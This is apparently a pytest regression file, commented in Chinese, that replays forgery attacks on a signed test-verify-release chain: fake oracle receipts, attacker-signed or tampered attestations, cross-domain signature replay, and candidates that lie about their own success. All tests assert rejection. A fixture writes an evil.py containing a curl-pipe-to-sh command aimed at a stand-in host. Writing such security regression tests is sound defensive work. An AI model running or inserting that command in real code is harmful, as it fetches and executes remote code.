"""P0-3 / P0-6 攻击回归:候选与调用方都无法伪造出一次真实发布。

本文件里的每一个 test 都是一次**实际做过的攻击**的原样重放。修复前它们全部
成功(能对一棵含 evil.py 的候选树产出真实 release manifest);修复后必须全部
被拒。

信任链:controller 签 test result → verifier 验签后签 verification attestation
→ release 验签后才发布。任一环验签失败一律 fail-closed。
"""
from __future__ import annotations

import os
import sys
from dataclasses import replace
from pathlib import Path

import pytest

from abcr.control.attestation import (
    DOMAIN_TEST_RESULT, DOMAIN_VERIFICATION, sign_attestation,
)
from abcr.control.black_box_oracle import (
    FIXTURE_UNSANDBOXED, SANDBOX_EXEC, UNSANDBOXED_LABEL, OracleReceipt, OracleRegistry,
    OracleSpec, SigningIdentity, equality_assertion, is_release_eligible_isolation,
    run_external_oracle,
)
from abcr.control.contracts import ContractError, sha256
from abcr.control.ed25519 import generate_keypair
from abcr.control.release import prepare_release
from abcr.control.test_controller import TestResultBundle, run_profile
from abcr.control.verifier import VerificationAttestation, verify_result
from abcr.control.worktree import scan_tree, tree_hash

HAS_SANDBOX = os.path.isfile(SANDBOX_EXEC) and os.access(SANDBOX_EXEC, os.X_OK)
ROOT = Path(__file__).resolve().parents[2]

PATH_REGISTRY = {"src/abcr/util/x.py": {"auto_release_eligible": True,
                                        "required_external_oracle_ids": ["equal"]}}
PROFILE = {"required_external_oracle_ids": ["equal"],
           "external_oracles": [{"oracle_id": "equal", "version": "1",
                                 "request": {"expected": 7}}]}
GOOD_CODE = ("import sys,json;q=json.loads(sys.stdin.readline());"
             "print(json.dumps({'nonce':q['nonce'],'result':7}))")


def keypair(tmp_path, name) -> SigningIdentity:
    keys = tmp_path / "keys"; keys.mkdir(parents=True, exist_ok=True)
    private, public = keys / f"{name}.key", keys / f"{name}.pub"
    generate_keypair(private, public)
    return SigningIdentity(private, public)


def registry():
    item = OracleRegistry(); item.register("equal", "1", equality_assertion); return item


def evil_tree(tmp_path):
    """一棵**含 evil.py** 的候选树 —— 攻击者想让它被发布出去。"""
    candidate = tmp_path / "candidate"; candidate.mkdir()
    (candidate / "evil.py").write_text("import os; os.system('curl evil.sh | sh')\n")
    python = candidate / "env/bin/python"; python.parent.mkdir(parents=True)
    python.write_text("#!/bin/sh\nexit 99\n"); python.chmod(0o500)
    module = candidate / "env/lib/python3.12/site-packages/abcr/control/panel.py"
    module.parent.mkdir(parents=True)
    module.write_text("def main():\n    return 0\n"); module.chmod(0o400)
    (candidate / "requirements.lock").write_text(
        "fixture==1 --hash=sha256:" + "a" * 64 + "\n")
    topology = candidate / "configs/control/service-topology-v1.json"
    topology.parent.mkdir(parents=True)
    topology.write_bytes((ROOT / "configs/control/service-topology-v1.json").read_bytes())
    return candidate, tree_hash(scan_tree(candidate))


def permissive_profile(tmp_path):
    path = tmp_path / "candidate.sb"
    path.write_text("(version 1)\n(allow default)\n")
    return str(path)


def verify_kwargs(candidate_hash, controller: SigningIdentity, verifier: SigningIdentity):
    return dict(base_tree_hash="b" * 64, expected_candidate_tree_hash=candidate_hash,
                expected_profile_hash=sha256(PROFILE),
                expected_oracle_registry_hash=registry().registry_hash,
                declared_risk="normal", changed_paths=("src/abcr/util/x.py",),
                path_registry=PATH_REGISTRY,
                controller_public_key=controller.public_key, signer=verifier)


# ================================================================= positive control

@pytest.mark.skipif(not HAS_SANDBOX, reason="sandbox-exec unavailable")
def test_honest_sandboxed_run_does_reach_a_release(tmp_path):
    """阳性对照:诚实的、真沙箱跑出来的结果必须能走完整条链。

    没有这条,上面所有「攻击被拒」都可能只是因为整条链根本跑不通。
    """
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    candidate, c_hash = evil_tree(tmp_path)
    bundle = run_profile(mission_id="M-OK", fencing_token=1, candidate_tree_hash=c_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", GOOD_CODE),
                         registry=registry(), isolation=permissive_profile(tmp_path),
                         signer=controller)
    assert bundle.verdict == "PASS" and is_release_eligible_isolation(bundle.isolation)
    verified = verify_result(bundle, **verify_kwargs(c_hash, controller, verifier))
    assert verified.verdict == "PASS"
    manifest = prepare_release(candidate, verified, verifier_public_key=verifier.public_key)
    assert manifest.release_id.startswith("REL-")


# ================================================================= P0-3 attack A: forged OracleReceipt

def test_forged_oracle_receipt_never_authorizes_release(tmp_path):
    """原始攻击 B2:凭空造一份 PASS OracleReceipt,**从未生成任何 oracle 进程**。"""
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    candidate, c_hash = evil_tree(tmp_path)

    fake_receipt = OracleReceipt(oracle_id="equal", version="1", input_hash="0" * 64,
                                 result_hash="1" * 64, verdict="PASS", reason="equal",
                                 completed_at="2026-07-20T00:00:00+00:00",
                                 isolation="sandbox-exec:" + "e" * 64)
    core = {"mission_id": "M-EVIL", "fencing_token": 1, "candidate_tree_hash": c_hash,
            "acceptance_profile_hash": sha256(PROFILE),
            "oracle_set_hash": registry().registry_hash,
            "oracle_receipts": [fake_receipt.as_dict()], "diagnostic_summary": {},
            "verdict": "PASS", "created_at": "2026-07-20T00:00:00+00:00",
            "isolation": "sandbox-exec:" + "e" * 64}
    forged = TestResultBundle(mission_id="M-EVIL", fencing_token=1, candidate_tree_hash=c_hash,
                              acceptance_profile_hash=core["acceptance_profile_hash"],
                              oracle_set_hash=core["oracle_set_hash"],
                              oracle_receipts=(fake_receipt,), diagnostic_summary={},
                              verdict="PASS", created_at=core["created_at"],
                              bundle_hash=sha256(core),   # 攻击者重算裸哈希 —— 不再是信任根
                              isolation=core["isolation"], sealed=None)

    with pytest.raises(ContractError) as exc:
        verify_result(forged, **verify_kwargs(c_hash, controller, verifier))
    assert exc.value.code == "test_bundle_unverified"
    assert not (candidate / "released").exists()


def test_forged_bundle_signed_by_attacker_key_is_rejected(tmp_path):
    """攻击者自带一把钥匙签一份伪造 bundle —— 不是 controller 的钥匙,拒。"""
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    attacker = keypair(tmp_path, "attacker")
    _, c_hash = evil_tree(tmp_path)

    fake_receipt = OracleReceipt(oracle_id="equal", version="1", input_hash="0" * 64,
                                 result_hash="1" * 64, verdict="PASS", reason="equal",
                                 completed_at="2026-07-20T00:00:00+00:00",
                                 isolation="sandbox-exec:" + "e" * 64)
    core = {"mission_id": "M-EVIL", "fencing_token": 1, "candidate_tree_hash": c_hash,
            "acceptance_profile_hash": sha256(PROFILE),
            "oracle_set_hash": registry().registry_hash,
            "oracle_receipts": [fake_receipt.as_dict()], "diagnostic_summary": {},
            "verdict": "PASS", "created_at": "2026-07-20T00:00:00+00:00",
            "isolation": "sandbox-exec:" + "e" * 64}
    sealed = sign_attestation(private_key=attacker.private_key, public_key=attacker.public_key,
                              domain=DOMAIN_TEST_RESULT, core=core)
    forged = TestResultBundle(mission_id="M-EVIL", fencing_token=1, candidate_tree_hash=c_hash,
                              acceptance_profile_hash=core["acceptance_profile_hash"],
                              oracle_set_hash=core["oracle_set_hash"],
                              oracle_receipts=(fake_receipt,), diagnostic_summary={},
                              verdict="PASS", created_at=core["created_at"],
                              bundle_hash=sha256(core), isolation=core["isolation"], sealed=sealed)
    with pytest.raises(ContractError) as exc:
        verify_result(forged, **verify_kwargs(c_hash, controller, verifier))
    assert exc.value.code == "test_bundle_unverified"


@pytest.mark.skipif(not HAS_SANDBOX, reason="sandbox-exec unavailable")
def test_verdict_flipped_after_signing_is_rejected(tmp_path):
    """把一份真实签过名的 FAIL bundle 的 verdict 改成 PASS —— core 不再匹配,拒。"""
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    _, c_hash = evil_tree(tmp_path)
    bad_code = "import os; os._exit(0)"
    bundle = run_profile(mission_id="M", fencing_token=1, candidate_tree_hash=c_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", bad_code),
                         registry=registry(), isolation=permissive_profile(tmp_path),
                         signer=controller)
    assert bundle.verdict == "FAIL"
    flipped = replace(bundle, verdict="PASS")
    with pytest.raises(ContractError) as exc:
        verify_result(flipped, **verify_kwargs(c_hash, controller, verifier))
    assert exc.value.code == "test_bundle_unverified"


@pytest.mark.skipif(not HAS_SANDBOX, reason="sandbox-exec unavailable")
def test_receipt_swapped_into_otherwise_valid_bundle_is_rejected(tmp_path):
    """真 bundle + 塞进一份伪造 PASS receipt —— bundle 签名覆盖 receipts,拒。"""
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    _, c_hash = evil_tree(tmp_path)
    bad_code = "import os; os._exit(0)"
    bundle = run_profile(mission_id="M", fencing_token=1, candidate_tree_hash=c_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", bad_code),
                         registry=registry(), isolation=permissive_profile(tmp_path),
                         signer=controller)
    fake = OracleReceipt(oracle_id="equal", version="1", input_hash="0" * 64,
                         result_hash="1" * 64, verdict="PASS", reason="equal",
                         completed_at="2026-07-20T00:00:00+00:00", isolation=bundle.isolation)
    swapped = replace(bundle, verdict="PASS", oracle_receipts=(fake,))
    with pytest.raises(ContractError) as exc:
        verify_result(swapped, **verify_kwargs(c_hash, controller, verifier))
    assert exc.value.code == "test_bundle_unverified"


# ================================================================= P0-3 attack B: forged verification

def test_forged_verification_attestation_never_reaches_prepare_release(tmp_path):
    """跳过 verifier,直接手造一份 PASS 的 VerificationAttestation。"""
    verifier = keypair(tmp_path, "verifier")
    candidate, c_hash = evil_tree(tmp_path)
    core = dict(mission_id="M-EVIL", fencing_token=1, base_tree_hash="b" * 64,
                candidate_tree_hash=c_hash, profile_hash="p" * 64, oracle_set_hash="o" * 64,
                changed_paths=["src/abcr/util/x.py"], verdict="PASS", verified_at="now",
                isolation="sandbox-exec:" + "e" * 64)
    forged = VerificationAttestation(**{**core, "changed_paths": ("src/abcr/util/x.py",)},
                                     attestation_hash=sha256(core), sealed=None)
    with pytest.raises(ContractError) as exc:
        prepare_release(candidate, forged, verifier_public_key=verifier.public_key)
    assert exc.value.code == "verification_unverified"


def test_test_result_attestation_cannot_be_replayed_as_verification(tmp_path):
    """域分隔:一份合法的 test-result 签名不能当 verification 证明用。"""
    verifier = keypair(tmp_path, "verifier")
    candidate, c_hash = evil_tree(tmp_path)
    core = dict(mission_id="M-EVIL", fencing_token=1, base_tree_hash="b" * 64,
                candidate_tree_hash=c_hash, profile_hash="p" * 64, oracle_set_hash="o" * 64,
                changed_paths=["src/abcr/util/x.py"], verdict="PASS", verified_at="now",
                isolation="sandbox-exec:" + "e" * 64)
    # 同一个 core、同一把真钥匙,但签在 *test result* 域上
    wrong_domain = sign_attestation(private_key=verifier.private_key,
                                    public_key=verifier.public_key,
                                    domain=DOMAIN_TEST_RESULT, core=core)
    forged = VerificationAttestation(**{**core, "changed_paths": ("src/abcr/util/x.py",)},
                                     attestation_hash=sha256(core), sealed=wrong_domain)
    with pytest.raises(ContractError) as exc:
        prepare_release(candidate, forged, verifier_public_key=verifier.public_key)
    assert exc.value.code == "verification_unverified"


def test_verification_signed_by_wrong_key_is_rejected(tmp_path):
    verifier = keypair(tmp_path, "verifier"); attacker = keypair(tmp_path, "attacker")
    candidate, c_hash = evil_tree(tmp_path)
    core = dict(mission_id="M-EVIL", fencing_token=1, base_tree_hash="b" * 64,
                candidate_tree_hash=c_hash, profile_hash="p" * 64, oracle_set_hash="o" * 64,
                changed_paths=["src/abcr/util/x.py"], verdict="PASS", verified_at="now",
                isolation="sandbox-exec:" + "e" * 64)
    sealed = sign_attestation(private_key=attacker.private_key, public_key=attacker.public_key,
                              domain=DOMAIN_VERIFICATION, core=core)
    forged = VerificationAttestation(**{**core, "changed_paths": ("src/abcr/util/x.py",)},
                                     attestation_hash=sha256(core), sealed=sealed)
    with pytest.raises(ContractError) as exc:
        prepare_release(candidate, forged, verifier_public_key=verifier.public_key)
    assert exc.value.code == "verification_unverified"


# ================================================================= candidate-side lies

@pytest.mark.skipif(not HAS_SANDBOX, reason="sandbox-exec unavailable")
@pytest.mark.parametrize("code,label", [
    ("import os; os._exit(0)", "exit_code"),
    ("print('<testsuite failures=\"0\" errors=\"0\"/>')", "fake_junit"),
    ("import sys,json;json.loads(sys.stdin.readline());print(json.dumps({'nonce':'guessed','result':7}))",
     "guessed_nonce"),
])
def test_candidate_self_reported_success_never_authorizes_release(tmp_path, code, label):
    """候选自报的 exit code / JUnit / 猜 nonce 一律不构成 PASS,更不构成发布。"""
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    candidate, c_hash = evil_tree(tmp_path)
    bundle = run_profile(mission_id="M", fencing_token=1, candidate_tree_hash=c_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", code),
                         registry=registry(), isolation=permissive_profile(tmp_path),
                         signer=controller)
    assert bundle.verdict == "FAIL", label
    verified = verify_result(bundle, **verify_kwargs(c_hash, controller, verifier))
    assert verified.verdict == "FAIL"
    with pytest.raises(ContractError) as exc:
        prepare_release(candidate, verified, verifier_public_key=verifier.public_key)
    assert exc.value.code == "verification_not_pass"


@pytest.mark.skipif(not HAS_SANDBOX, reason="sandbox-exec unavailable")
def test_candidate_writing_result_spool_is_blocked_and_unpersuasive(tmp_path):
    """P0-6 原始攻击:候选直写 result spool 并返回 PASS。

    真沙箱下写入被内核拒绝;spool 里的任何东西本来也不进 verdict。
    """
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    candidate, c_hash = evil_tree(tmp_path)
    spool = tmp_path / "result-spool"; spool.mkdir()
    real_spool = os.path.realpath(spool)
    profile_file = tmp_path / "deny-spool.sb"
    profile_file.write_text('(version 1)\n(allow default)\n'
                            '(deny file-write* (subpath (param "SPOOL")))\n')
    code = ("import sys,json,pathlib\n"
            "try:\n"
            f"    pathlib.Path({str(spool / 'M-1.json')!r}).write_text("
            "'{\"verdict\": \"PASS\"}')\n"
            "except Exception:\n    pass\n"
            "q=json.loads(sys.stdin.readline())\n"
            "print(json.dumps({'nonce':q['nonce'],'result':7}))\n")
    bundle = run_profile(mission_id="M", fencing_token=1, candidate_tree_hash=c_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", code),
                         registry=registry(), isolation=str(profile_file), signer=controller,
                         sandbox_params={"SPOOL": real_spool})
    assert not (spool / "M-1.json").exists(), "候选写进了 result spool —— 隔离失效"
    assert bundle.verdict == "PASS"  # 它确实答对了 oracle,PASS 来自受信父进程而非 spool


# ================================================================= P0-6 sentinel cannot ship

def test_unsandboxed_fixture_result_cannot_be_verified_or_released(tmp_path):
    """哨兵跑出来的结果:fixture 跑得动,但 verify_result / prepare_release 都拒。"""
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    candidate, c_hash = evil_tree(tmp_path)
    bundle = run_profile(mission_id="M", fencing_token=1, candidate_tree_hash=c_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", GOOD_CODE),
                         registry=registry(), isolation=FIXTURE_UNSANDBOXED, signer=controller)
    # fixture 确实跑起来了,而且哨兵对下游可见
    assert bundle.verdict == "PASS" and bundle.isolation == UNSANDBOXED_LABEL
    assert all(r.isolation == UNSANDBOXED_LABEL for r in bundle.oracle_receipts)

    with pytest.raises(ContractError) as exc:
        verify_result(bundle, **verify_kwargs(c_hash, controller, verifier))
    assert exc.value.code == "unsandboxed_result_forbidden"

    # 纵深:即使有人绕过 verifier 直接造一份带哨兵的合法签名 attestation,发布闸也拒。
    core = dict(mission_id="M", fencing_token=1, base_tree_hash="b" * 64,
                candidate_tree_hash=c_hash, profile_hash=sha256(PROFILE),
                oracle_set_hash=registry().registry_hash,
                changed_paths=["src/abcr/util/x.py"], verdict="PASS", verified_at="now",
                isolation=UNSANDBOXED_LABEL)
    sealed = sign_attestation(private_key=verifier.private_key, public_key=verifier.public_key,
                              domain=DOMAIN_VERIFICATION, core=core)
    attestation = VerificationAttestation(
        **{**core, "changed_paths": ("src/abcr/util/x.py",)},
        attestation_hash=sha256(core), sealed=sealed)
    with pytest.raises(ContractError) as exc:
        prepare_release(candidate, attestation, verifier_public_key=verifier.public_key)
    assert exc.value.code == "unsandboxed_result_forbidden"


def test_fabricated_sandbox_label_still_needs_a_real_signature(tmp_path):
    """光把 isolation 字段写成 sandbox-exec:… 没用 —— 它在签名 core 里。"""
    controller = keypair(tmp_path, "controller"); verifier = keypair(tmp_path, "verifier")
    _, c_hash = evil_tree(tmp_path)
    bundle = run_profile(mission_id="M", fencing_token=1, candidate_tree_hash=c_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", GOOD_CODE),
                         registry=registry(), isolation=FIXTURE_UNSANDBOXED, signer=controller)
    relabelled = replace(bundle, isolation="sandbox-exec:" + "e" * 64)
    with pytest.raises(ContractError) as exc:
        verify_result(relabelled, **verify_kwargs(c_hash, controller, verifier))
    assert exc.value.code == "test_bundle_unverified"
